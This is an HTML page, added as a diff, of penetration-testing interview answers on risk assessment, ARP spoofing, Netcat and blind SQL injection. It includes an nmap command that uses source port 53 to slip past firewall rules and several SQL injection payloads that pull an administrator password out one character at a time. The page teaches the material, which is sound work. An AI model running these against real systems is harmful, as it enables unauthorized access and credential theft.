+<li>Information Gathering</li>
+<li>Reconnaissance</li>
+<li>Discovery and Scanning</li>
+<li>Vulnerability Assessment</li>
+<li>Exploitation</li>
+<li>Post Exploitation</li>
+</ul>
+<h3 id="what-is-the-difference-between-a-risk-assessment-vulnerability-assessment-and-penetration-test">What is the difference between a risk assessment, vulnerability assessment, and penetration test?</h3>
+<p>Risk Assessment is composed by 5 steps:</p>
+<ul>
+<li><strong>Context establishment</strong>: Identify and describe the context of the Risk Assessment process, considering external and internal context. Must contain identification of the party involved, assumption declaration, relevant assets for RA, risk scales definition, risk evaluation criteria.</li>
+<li><strong>Risk identification</strong>: is the set of activities aiming to identify, describe, and document risks and possible causes of risk.
+<ul>
+<li>Identify threats and understand how may lead to incident.</li>
+</ul>
+</li>
+<li><strong>Risk Analysis</strong>: is the activity aiming to estimate and determine the level of the identified risks, the level is derived from the combination of the likelihood and consequence. Likelihood estimation is to determine the frequency or probability of incidents to occur using the defined likelihood scale.</li>
+<li><strong>Risk Evaluation</strong>: is the set of activities involving the comparison of the risk analysis results with the risk evaluation criteria to determine which risks should be considered for treatment.</li>
+<li><strong>Risk Treatment</strong>: The risk treatment is the set of activities aiming to identify and select means for risk mitigation and reduction
+<ul>
+<li>Reduction: reduce the likelihood or the consequence of incidents</li>
+<li>Retention: Accept the risk</li>
+<li>Avoidance: avoid the activity that rise to the risk in question</li>
+<li>Sharing: transfer the risk to another party, like an insurance or sub-contracting</li>
+</ul>
+</li>
+</ul>
+<p>A vulnerability assessment is a systematic review of security weaknesses in an information system. It evaluates if the system is susceptible to any known vulnerabilities, assigns severity levels to those vulnerabilities, and recommends remediation or mitigation, if and whenever needed.</p>
+<p>A penetration testing is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system; this is not to be confused with a vulnerability assessment. The test is performed to identify weaknesses (also referred to as vulnerabilities), including the potential for unauthorized parties to gain access to the system&rsquo;s features and data. Pen testing can involve the attempted breaching of any number of application systems, (e.g., application protocol interfaces (APIs), frontend/backend servers) to uncover vulnerabilities, such as unsanitized inputs that are susceptible to code injection attacks.</p>
+<h3 id="what-is-the-difference-between-arp-spoofing-and-arp-poisoning">What is the difference between ARP Spoofing and ARP Poisoning?</h3>
+<p>ARP poisoning is an attack that is accomplished using the technique of ARP spoofing.</p>
+<p>ARP spoofing is a technique that allows an attacker to craft a &ldquo;fake&rdquo; ARP packet that looks like it came from a different source, or has a fake MAC address in it.</p>
+<p>An attacker uses the process of ARP spoofing to &ldquo;poison&rdquo; a victim&rsquo;s ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.</p>
+<h3 id="when-running-an-nmap-scan-what-source-port-can-you-specify-to-scan-from-to-commonly-bypass-firewall-rules">When running an nmap scan, what source port can you specify to scan from to commonly bypass firewall rules?</h3>
+<p>A common error that many administrators are doing when configuring firewalls is to set up a rule to allow all incoming traffic that comes from a specific poert number. The <em>source-port</em> option of Nmap can be used to exploit this missconfiguration. Common ports that you can use for this type of scan are: 20, 53 and 67. <code>nmap --source-port 53 &lt;IP/Host&gt;</code></p>
+<h3 id="differences-between-netcat-and-ncat">Differences between Netcat and Ncat</h3>
+<p><em>nc</em> and <em>netcat</em> are two names for the same program (typically, one will be a symlink to the other). It is a computer networking utility for reading from and writing to network connections using TCP or UDP.</p>
+<p><em>Ncat</em> is the same idea, but from the Nmap project. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat.</p>
+<h3 id="what-about-blind-sql-injection-and-how-is-it-different-from-other-kinds">What about Blind SQL Injection and how is it different from other kinds?</h3>
+<p>Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>
+<p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application&rsquo;s responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.</p>
+<p>In this situation there is no result of the query but a feedback from the application which can be any arbitrary string, while in case of failure there will be no type of response. For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.</p>
+<p>To do this, we start with the following input:</p>
+<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'r </code>
+<code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'o </code>
+<code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'o </code>
+<code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 't </code></p>
+<p>When a letter give a feedback it means that the letter is part of the password, many other techniques may be found <a href="https://portswigger.net/web-security/sql-injection/blind">here</a>.</p>
+
+</div>
+
+        </div>
+    <div id="footer">
+        <hr>
+        <div class="container text-center mb-2">
+            <a href="https://github.com/benwick921"><small>Jafor</small></a>
+        </div>
+    </div>
+
+</body>
+</html>
